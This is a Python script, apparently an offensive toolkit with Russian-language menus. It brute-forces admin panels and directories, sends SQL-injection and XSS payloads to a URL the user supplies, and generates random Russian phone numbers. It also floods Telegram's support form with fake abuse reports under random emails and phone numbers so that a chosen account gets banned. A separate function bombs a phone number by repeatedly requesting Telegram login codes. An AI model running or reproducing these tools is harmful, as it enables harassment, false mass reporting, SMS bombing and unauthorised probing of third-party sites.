import time
import requests
import random
import socket
import telebot
import colorama
from colorama import Fore, Back, Style
import os
from art import tprint


headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}
colorama.init()
print (Fore.YELLOW + "")



def slow_typing(text, delay=0.02):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

slow_typing("Добро пожаловать! Используйте программу по назначению!")

time.sleep(1)


print (Fore.RED + "")

tprint ("EXIT")

print("------------------------------------")

print (Fore.YELLOW + "")
time.sleep(1)




    

                

def gen():
    kol = input("Количество номеров:")
    time.sleep(1)
    print ("Номера...")
    for h in range(int(kol)):
        phone = random.randint(79000000000, 79999999999)
        print (phone)
    time.sleep(215)
    

def gp():
    print (Fore.GREEN + '')
    
    target_url = input("Введите URL сайта для проверки: ")
    
    payloads_sql = ["' OR '1'='1", '" OR "1"="1']
    
    payloads_xss = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
    
    for payload in payloads_sql:
        response = requests.get(f"{target_url}?id={payload}")
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print (Fore.RED + '')
            print(f"SQL-инъекция найдена: {response.url}")
        else:
            print (Fore.YELLOW + '')
            print ('SQL не найден! +++ Сайт защищён!')
    time.sleep(62)

    for payload in payloads_xss:
        response = requests.get(f"{target_url}?search={payload}")
        if payload in response.text:
            print (Fore.RED + '')
            print(f"XSS уязвимость найдена: {response.url}")
        else:
            print (Fore.YELLOW + '')
            print ('XSS не найден! +++Сайт защищён!')
    time.sleep(62)
            
    

def snos():
    url = "https://telegram.org/support"
    text = "Накручивает подписчиков. Line:"
    print ("URL")
    name = input(">")
    kl = input("Потоки:")
    ml = "@gmail.com"
    ban = (text, name)
    time.sleep(1)
    for i in range(int(kl)):
        
        num = random.randint(79111111111, 79999999999)
        mail = random.randint(1111111111, 99999999999)
        ms = (str(mail) + ml)
        res = requests.post(url, data={'message': ban} and {'email': ms} and {'phone': num}, headers=headers)
        print ("СНОС ТГ...", res.status_code)
                

            
                
def sms():
    tgs = "https://my.telegram.org/auth/send_password"
    ph = input("Номер:")
    pv = input("Кол-во sms:")
    for k in range(int(pv)):
        res = requests.post(tgs, data={'phone': ph}, headers=headers)
        print ("Cообщение отправлено!", res.status_code)
        time.sleep(0.75)
    
    

print (Fore.CYAN +  'Telegramm: @exitbaza')
print (Fore.YELLOW +  "_____________________________________________")
print ("|  1. Поиск каталогов сайта                                           ")
print ("|  2. Генератор Номеров                               ")
print ("|  3. Общение с users через бота тг             ")
print ("|  4. Поиск SQL уязвимостей   ")
print ("|  5. Сносер                                                      ")
print ("|  6. Смс  telegramm")
print ("|  0. Выход                                                      ")
print ("---------------------------------------------")


print ("")
user = input("Введите номер действия>")

if user == "5":
    snos()



if user == "4":
    gp()

if user == "2":
    gen()

if user == "0":
    exit()

if user == "6":
    sms()

if user == "3":
    token = input("Токен бота:")
    bot = telebot.TeleBot(token)
    @bot.message_handler(commands=["start"])
    def start(m, res=False):
        bot.send_message(m.chat.id, 'Я на связи. Напиши мне что-нибудь )')
        while True:
            @bot.message_handler(content_types=["text"])
            def handle_text(message):
                print ("Noname:", message.text)
                n = input("Вы:")
                bot.send_message(m.chat.id, n)
    bot.polling(none_stop=True, interval=0)

if user == "1":
    url = input("url:")
    

    adm = ['admin', 'webadmin', 'administrator', '0admin', 'manedger', 'hello', 'aadmin', 'admins', 'login', 'auto',]

    kt = [
    'blog',
    'users',
    'settings',
    'content',
    'reports',
    'security',
    'access',
    'logging',
    'support',
    'integrations',
    'monitoring',
    'dashboard',
    'analytics',
    'notifications',
    'roles',
    'permissions',
    'database',
    'backup',
    'restore',
    'performance',
    'activity',
    'api',
    'data',
    'status',
    'updates',
    'customization',
    'themes',
    'plugins',
    'modules',
    'configuration',
    'logs',
    'session',
    'feedback',
    'groups',
    'search',
    'billing',
    'invoices',
    'subscriptions',
    'transactions',
    'reports',
    'visualization',
    'segmentation',
    'testing',
    'settings',
    'sitemap',
    'cache',
    'firewall',
    'certificates',
    'registration',
    'policies',
    'authentication',
    'verification',
    'products',
    'orders',
    'inventory',
    'shipping',
    'payment',
    'discounts',
    'promotions',
    'support',
    'tickets',
    'knowledge',
    'community',
    'feedback',
    'requests',
    'reports',
    'logs',
    'settings',
    'notifications',
    'engagement',
    'integration',
    'metrics',
    'configuration',
    'retention',
    'privacy',
    'terms',
    'consent',
    'compliance',
    'accessibility',
    'mobile',
    'multi-language',
    'scheduling',
    'tutorials',
    'mapping',
    'cleaning',
    'validation',
    'insights',
    'fields',
    'tags',
    'categories',
    'sources',
    'segmentation',
    'metadata',
    'parameters',
    'variables',
    'elements',
    'settings',
    'options',
    'features',
    'modules',
    'components',
    'widgets',
    'dashboard',
    'profiles',
    'roles',
    'permissions',
    'settings'
]

    print ('1. Поиск админ панели')
    print ('2. Поиск других каталогов')
    print (Fore.BLUE + '')

    usvb = input("Выерите значение:")

    

    if usvb == "1":
        for term in adm:
            
            res = requests.get(url + term, headers=headers)
            print (Fore.BLUE + '')
            if (res.status_code) == 200:
                print ("+ Запрос отправлен:", term, Fore.YELLOW + "Успешно найдено")
                
            else:
                print ("+ Запрос отправлен:", term, Fore.RED + "No katalog")
                
    else:
        for ln in kt:
            
            res = requests.get(url + ln, headers=headers)
            print (Fore.BLUE + '')
            if (res.status_code) == 200:
                print ("+ Запрос отправлен:", ln, Fore.YELLOW + "Успешно найдено")
                
            else:
                print ("+ Запрос отправлен:", ln, Fore.RED + "No katalog")
                
        

    
    
    
    
    
      
    
    










    
